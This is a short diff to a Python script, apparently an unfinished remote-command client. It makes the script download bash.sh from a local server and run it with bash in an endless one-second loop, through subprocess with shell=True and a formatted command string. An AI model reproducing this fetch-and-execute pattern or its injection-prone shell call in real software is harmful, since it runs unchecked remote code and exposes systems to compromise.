@@ -8,6 +8,7 @@ from sys import exit
 import signal
 from random import randint
 from tempfile import mkdtemp, NamedTemporaryFile
+from subprocess import call, PIPE
 
 # Dictionary with urls as a key and filenames as values
 TEMP_FILES = {}
@@ -48,6 +49,9 @@ def download_item(url, **kwargs):
 
     return True
 
+def execute_item(path, *args):
+    return call([path, *args], shell=True)#, stdout=PIPE, stderr=PIPE)
+
 def exit_gracefully():
     print("Exiting")
     print("Files to clean: {}".format(len(TEMP_FILES)))
@@ -59,11 +63,13 @@ def exit_gracefully():
     exit()
 
 def main():
-    download_item("http://andresjruiz.com")
+    download_item("http://localhost:8000/bash.sh")
+    print(TEMP_FILES["http://localhost:8000/bash.sh"])
 
     while(True):
         print("Checking...")
-        get_command()
+        p = execute_item("bash {}".format(TEMP_FILES["http://localhost:8000/bash.sh"]))
+        #print("p: {}".format(dir(p)))
         time.sleep(1)
 
 
